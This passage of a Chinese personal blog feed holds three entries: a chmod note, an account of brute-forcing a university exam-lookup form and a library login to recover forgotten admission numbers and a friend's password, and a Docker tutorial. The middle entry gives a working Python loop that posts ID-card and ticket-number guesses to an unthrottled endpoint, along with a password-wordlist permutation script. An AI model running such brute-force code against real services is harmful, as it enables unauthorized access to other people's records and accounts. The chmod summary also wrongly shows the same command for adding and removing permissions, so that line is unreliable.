href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.runoob.com/linux/linux-comm-chmod.html" target="_blank" rel="noopener">Linux chmod命令</a></li><li><a href="https://zh.wikipedia.org/wiki/Inode" target="_blank" rel="noopener">inode-wiki</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;基本原理&quot;&gt;&lt;a href=&quot;#基本原理&quot; class=&quot;headerlink&quot; title=&quot;基本原理&quot;&gt;&lt;/a&gt;基本原理&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://img.dyngq.top/images/20201108212435.jpg&quot; alt=&quot;img&quot; style=&quot;zoom:33%;&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;加权限 chmod u+rwx,g+rwx,o+rwx file&lt;/li&gt;
&lt;li&gt;减权限 chmod u+rwx,g+rwx,o+rwx file&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Sec" scheme="http://www.dyngq.top/categories/Sec/"/>
    
    
      <category term="Sec" scheme="http://www.dyngq.top/tags/Sec/"/>
    
      <category term="Linux" scheme="http://www.dyngq.top/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>记一次准考证号“爆破”以及另一次密码爆破</title>
    <link href="http://www.dyngq.top/2020/03/20/20200320-%E5%87%86%E8%80%83%E8%AF%81%E5%8F%B7%E2%80%9C%E7%88%86%E7%A0%B4%E2%80%9D%E2%80%94%E2%80%94%E8%A7%A3%E5%86%B3%E5%BF%98%E8%AE%B0%E5%87%86%E8%80%83%E8%AF%81%E5%8F%B7%E6%97%A0%E6%B3%95%E6%9F%A5%E8%AF%A2%E8%80%83%E7%A0%94%E5%88%9D%E5%A7%8B%E6%88%90%E7%BB%A9%EF%BC%88%E6%A0%A1%E5%AE%98%E7%BD%91%EF%BC%89/"/>
    <id>http://www.dyngq.top/2020/03/20/20200320-准考证号“爆破”——解决忘记准考证号无法查询考研初始成绩（校官网）/</id>
    <published>2020-03-20T00:40:00.000Z</published>
    <updated>2022-06-20T11:44:21.553Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>解决忘记准考证号无法查询考研初始成绩，解决强密码忘记密码且无法重制；</p><p>考研查成绩阶段，很多同学跟我说忘记准考证号了；</p><p>所以找了一个接口，进行了简单的爆破匹配；</p></blockquote><a id="more"></a><p>找到了一个当时用来查考场的网页，一般像这种只实现简单功能的小网页安全性都较差；</p><p>这个就不例外，没有次数限制，没有验证码校验，所以可以直接循环提交表单进行爆破。</p><p><img src="https://img.dyngq.top/images/20210304210231.png" alt="image-20210304195742262"></p><p>想要查询的同学只需要提供身份证号即可，根据大致的准考证号的范围进行逐个爆破，根据返回内容的长度等判断是否爆破成功。简单的代码示例放在最后。</p><h2 id="另一个密码爆破！"><a href="#另一个密码爆破！" class="headerlink" title="另一个密码爆破！"></a>另一个密码爆破！</h2><blockquote><p>由于学校要求弱密码全部改为强密码，kang同学自信的改为了很复杂的密码，而且不放心chrome，不让其记住密码；结果就是，忘记了；到查成绩的时候发现无法重置密码；</p></blockquote><p>好在同样的强密码用在了很多地方，其中一个图书馆网站没有开启验证码校验，存在爆破可能。</p><p>所以根据kang同学回忆，提取了几个可能的关键词，因为强密码要求大小写字母、数字、特殊符号同时存在，所以构建排列组合，获取到了用于爆破的字典。</p><p>搞过密码爆破的其实都知道，最重要的就是字典，字典里没有，再爆破也没用。</p><p>好在kang同学回忆的关键词比较全，最终用类似的方法爆破到了密码。最后会放一个构建字典的简单代码。</p><h2 id="准考证爆破简单示例代码"><a href="#准考证爆破简单示例代码" class="headerlink" title="准考证爆破简单示例代码"></a>准考证爆破简单示例代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request,parse</span><br><span class="line"><span class="keyword">from</span> html.parser <span class="keyword">import</span> HTMLParser</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logon</span><span class="params">(testID,IDcard)</span>:</span></span><br><span class="line">    PostUrl = <span class="string">'http://***.58.***.71:8088/zskc/checklogin'</span></span><br><span class="line">    testID = testID</span><br><span class="line"></span><br><span class="line"><span class="comment">#构建登录data</span></span><br><span class="line">    login_data = parse.urlencode([</span><br><span class="line">    (<span class="string">'bkType'</span>, <span class="string">'now'</span>),</span><br><span class="line">    (<span class="string">'zkzh'</span>, testID),</span><br><span class="line">    (<span class="string">'sfzh'</span>, IDcard),</span><br><span class="line">    ])</span><br><span class="line">    req = request.Request(PostUrl)</span><br><span class="line"></span><br><span class="line"><span class="comment">#构建登录head 请求头</span></span><br><span class="line">    req.add_header(<span class="string">'Accept'</span>, <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'</span>),</span><br><span class="line">    req.add_header(<span class="string">'Accept-Encoding'</span>, <span class="string">'gzip, deflate'</span>),</span><br><span class="line">    req.add_header(<span class="string">'Accept-Language'</span>, <span class="string">'zh-CN,zh;q=0.9,en;q=0.8'</span>),</span><br><span class="line">    req.add_header(<span class="string">'Cache-Control'</span>, <span class="string">'max-age=0'</span>),</span><br><span class="line">    req.add_header(<span class="string">'Connection'</span>, <span class="string">'keep-alive'</span>),</span><br><span class="line">    req.add_header(<span class="string">'Content-Length'</span>, <span class="string">'55'</span>),</span><br><span class="line">    req.add_header(<span class="string">'Content-Type'</span>, <span class="string">'application/x-www-form-urlencoded'</span>),</span><br><span class="line">    req.add_header(<span class="string">'Cookie'</span>, <span class="string">'JSESSIONID=1A5F7DD34539699E9EC7CB7298745713'</span>),</span><br><span class="line">    req.add_header(<span class="string">'Host'</span>, <span class="string">'***.58.***.71:8088'</span>),</span><br><span class="line">    req.add_header(<span class="string">'Origin'</span>, <span class="string">'http://***.58.***.71:8088'</span>),</span><br><span class="line">    req.add_header(<span class="string">'Referer'</span>, <span class="string">'http://***.58.***.71:8088/zskc/'</span>),</span><br><span class="line">    req.add_header(<span class="string">'Upgrade-Insecure-Requests'</span>, <span class="string">'1'</span>),</span><br><span class="line">    req.add_header(<span class="string">'User-Agent'</span>, <span class="string">'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36'</span>),</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> request.urlopen(req,data=login_data.encode(<span class="string">'utf-8'</span>)) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">if</span> f.read().decode(<span class="string">'GBK'</span>).find(<span class="string">'alert'</span>)==<span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">global</span> flag</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            print(f.read().decode(<span class="string">'GBK'</span>))</span><br><span class="line">            print(<span class="string">"准考证号为："</span>+testID)</span><br><span class="line">        <span class="keyword">return</span>(f.read().decode(<span class="string">'GBK'</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    idcard = input(<span class="string">"请输入要查询的身份证号："</span>)</span><br><span class="line">    mi,mx = input(<span class="string">"请输入准考证号后四位的范围（10424953000****）："</span>).split()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(mi), int(mx)):</span><br><span class="line">        <span class="keyword">global</span> flag</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        a = <span class="string">'10424953000'</span></span><br><span class="line">        a = a + str(<span class="string">'%04d'</span> % i)</span><br><span class="line"></span><br><span class="line">        logon(a,idcard)</span><br><span class="line">        <span class="keyword">del</span> a</span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="构建字典的简单代码"><a href="#构建字典的简单代码" class="headerlink" title="构建字典的简单代码"></a>构建字典的简单代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dict</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">pw_01 = []</span><br><span class="line">pw_02 = []</span><br><span class="line">pw_03 = []</span><br><span class="line">pw_04 = []</span><br><span class="line"></span><br><span class="line">all_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pw_01:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> pw_02:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> pw_03:</span><br><span class="line">            all_list.append(i+j+k)</span><br><span class="line">            all_list.append(i+k+j)</span><br><span class="line">            all_list.append(k+i+j)</span><br><span class="line">            all_list.append(k+j+i)</span><br><span class="line">            all_list.append(j+i+k)</span><br><span class="line">            all_list.append(j+k+i)</span><br><span class="line">            <span class="comment"># print(i+j+k)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pw_02:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> pw_03:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> pw_04:</span><br><span class="line">            all_list.append(i+j+k)</span><br><span class="line">            all_list.append(i+k+j)</span><br><span class="line">            all_list.append(k+i+j)</span><br><span class="line">            all_list.append(k+j+i)</span><br><span class="line">            all_list.append(j+i+k)</span><br><span class="line">            all_list.append(j+k+i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(all_list)</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'student.txt'</span>,mode=<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> all_list:</span><br><span class="line">        f.write(i+<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;解决忘记准考证号无法查询考研初始成绩，解决强密码忘记密码且无法重制；&lt;/p&gt;
&lt;p&gt;考研查成绩阶段，很多同学跟我说忘记准考证号了；&lt;/p&gt;
&lt;p&gt;所以找了一个接口，进行了简单的爆破匹配；&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Sec" scheme="http://www.dyngq.top/categories/Sec/"/>
    
    
      <category term="Sec" scheme="http://www.dyngq.top/tags/Sec/"/>
    
  </entry>
  
  <entry>
    <title>Docker 总结</title>
    <link href="http://www.dyngq.top/2020/02/07/20200207-docker/"/>
    <id>http://www.dyngq.top/2020/02/07/20200207-docker/</id>
    <published>2020-02-07T00:45:00.000Z</published>
    <updated>2022-06-20T11:44:21.552Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>之前大体上玩儿过，但是一直没有完整的使用过；这次借着天池的一个新人赛 <a href="https://tianchi.aliyun.com/competition/entrance/231759/introduction" target="_blank" rel="noopener">【入门】Docker练习场</a>，梳理了一下docke的基本操作。</p></blockquote><a id="more"></a><h2 id="window下docker解决方案"><a href="#window下docker解决方案" class="headerlink" title="window下docker解决方案"></a>window下docker解决方案</h2><ul><li>docker对于unix是比较友好的，无需累述；docker在windows下一直没有好的解决方案，今天花了一天的时间终于找到了最好的解决方案，并且完成了比赛。</li><li>的目前为止最好的解决方案还是docker for windows，之前的解决方案可能是VM、或者win10子系统WSL里的docker，wsl虽然很方便也有方法能起来docker，但是很容易碰见这样那样的问题，docker守护进程方面很难弄。之所以说docker for windows是最好的解决方案是因为他的新版本解决了对于hyper-v的依赖，使得他自己与VM等不会发生冲突，这就解决了他之前最大的弊端，使用起来没有复杂的障碍与冲突。详细的进步在<a href="https://www.zhihu.com/question/339939686" target="_blank" rel="noopener">知乎：Windows下想使用Linux环境，WSL、Docker、VM应该怎么选择？</a>。</li><li>windows下安装也很简单，<a href="https://store.docker.com/editions/community/docker-ce-desktop-windows" target="_blank" rel="noopener">Welcome to Docker Hub: Download and Take a Tutorial</a>。</li><li>记得开启docker的镜像加速，不然下载镜像会很慢，可以使用阿里云的加速，<a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors" target="_blank" rel="noopener">阿里云加速链接</a>。</li></ul><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><div class="table-container"><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">操作</th></tr></thead><tbody><tr><td style="text-align:center">docker images</td><td style="text-align:center">查看已存在镜像</td></tr><tr><td style="text-align:center">docker ps</td><td style="text-align:center">查看正在运行的容器</td></tr><tr><td style="text-align:center">docker ps -a</td><td style="text-align:center">查看所有容器</td></tr><tr><td style="text-align:center">docker run -it [打包的镜像名称]:[tag] bash</td><td style="text-align:center">启动镜像</td></tr><tr><td style="text-align:center">docker commit -a “dyngq” -m “test” [容器名称或id] [打包的镜像名称]:[tag]</td><td style="text-align:center">将容器打包成镜像</td></tr><tr><td style="text-align:center">docker rm</td><td style="text-align:center">删除容器</td></tr><tr><td style="text-align:center">docker rmi</td><td style="text-align:center">删除镜像</td></tr><tr><td style="text-align:center">docker bulid -t [打包的镜像名称]:[tag]</td><td style="text-align:center">根据Dockerfile打包镜像</td></tr><tr><td style="text-align:center">docker start</td><td style="text-align:center">启动容器</td></tr><tr><td style="text-align:center">docker attach</td><td style="text-align:center">进入容器</td></tr></tbody></table></div><h3 id="将容器打包成镜像"><a href="#将容器打包成镜像" class="headerlink" title="将容器打包成镜像"></a>将容器打包成镜像</h3><p>docker commit -a “dyngq” -m “test” [容器名称或id] [打包的镜像名称]:[tag]</p><p>-a :提交的镜像作者；<br>-c :使用Dockerfile指令来创建镜像；<br>-m :提交时的说明文字；<br>-p :在commit时，将容器暂停。</p><h3 id="Dockerfile示例"><a href="#Dockerfile示例" class="headerlink" title="Dockerfile示例"></a>Dockerfile示例</h3><p><a href="./docker/tianchi_submit_demo/Dockerfile">Dockfile</a></p><pre><code># Base Images## 从带有numpy的python镜像FROM numpy:1.0## 把当前文件夹里的文件构建到镜像的根目录下ADD . /## 指定默认工作目录为根目录（需要把run.sh和生成的结果文件都放在该文件夹下，提交后才能运行）WORKDIR /## 镜像启动后统一执行 sh run.shCMD [&quot;sh&quot;, &quot;run.sh&quot;]</code></pre><h3 id="其他一些常用参考链接"><a href="#其他一些常用参考链接" class="headerlink" title="其他一些常用参考链接"></a>其他一些常用参考链接</h3><ul><li><a href="https://www.runoob.com/docker/docker-tutorial.html" target="_blank" rel="noopener">菜鸟教程的docker教学</a></li><li><a href="https://www.optbbs.com/forum.php?mod=viewthread&amp;ordertype=1&amp;tid=8431044" target="_blank" rel="noopener">docker如何部署您的第一个应用程序</a></li><li>pass</li></ul><h2 id="天池"><a href="#天池" class="headerlink" title="天池"></a>天池</h2><blockquote><p><a href="https://tianchi.aliyun.com/competition/entrance/231759/tab/174" target="_blank" rel="noopener">手把手超详细操作说明</a></p></blockquote><ol><li>创建阿里云的docker仓库</li><li>pull拉取提供的python3镜像</li><li>启动镜像，在这个容器内安装numpy<br> ( pip install numpy -i <a href="https://pypi.tuna.tsinghua.edu.cn/simple" target="_blank" rel="noopener">https://pypi.tuna.tsinghua.edu.cn/simple</a>)</li><li>将安装有numpy的容器打包成镜像</li><li>写好Dockerfile，写好sh和py</li><li>push上去</li><li>提交结果</li></ol><p>本次提交的所有文件都在./docker文件夹内</p><p>py文件</p><pre><code># import pandas as pdimport numpy as npimport json# df = pd.read_csv(&quot;/tcdata/num_list.csv&quot;)# df = pd.read_csv(&quot;./docker/tianchi_submit_demo/data/tcdata/num_list.csv&quot;)# print(df)numbers = np.loadtxt(open(&quot;./tcdata/num_list.csv&quot;,&quot;rb&quot;),delimiter=&quot;,&quot;,skiprows=0,dtype=&#39;int&#39;)# numbers = np.loadtxt(open(&quot;./docker/tianchi_submit_demo/data/tcdata/num_list.csv&quot;,&quot;rb&quot;),delimiter=&quot;,&quot;,skiprows=0,dtype=&#39;int&#39;)# numbers = np.random.randint(1,30,size=50,dtype=&#39;int32&#39;)# print(numbers)# np.savetxt(&#39;./docker/tianchi_submit_demo/data/tcdata/num_list.csv&#39;, numbers,delimiter = &#39;,&#39;)# print(&quot;hello_world&quot;)# print(numbers,type(numbers.tolist()))r_sum = np.sum(numbers)top10 = numbers[np.argpartition(numbers,-10)[-10:]]top10 = np.sort(top10).tolist()top10.reverse()# print(top10, type(top10))result = {    &quot;Q1&quot;: &quot;Hello world&quot;,    &quot;Q2&quot;: r_sum.tolist(),    # C004 注意：TOP10 若包含重复值    &quot;Q3&quot;: top10}with open(&quot;result.json&quot;, &quot;w&quot;) as f:    json.dump(result, f) </code></pre><p><img src="images/dyngq_2020-02-07-23-47-46.png" alt="&#39;dyngq_images&#39;"></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;之前大体上玩儿过，但是一直没有完整的使用过；这次借着天池的一个新人赛 &lt;a href=&quot;https://tianchi.aliyun.com/competition/entrance/231759/introduction&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;【入门】Docker练习场&lt;/a&gt;，梳理了一下docke的基本操作。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Sec" scheme="http://www.dyngq.top/categories/Sec/"/>
    
    
      <category term="Docker" scheme="http://www.dyngq.top/tags/Docker/"/>
    
      <category term="Sec" scheme="http://www.dyngq.top/tags/Sec/"/>
    
  </entry>
  
</feed>
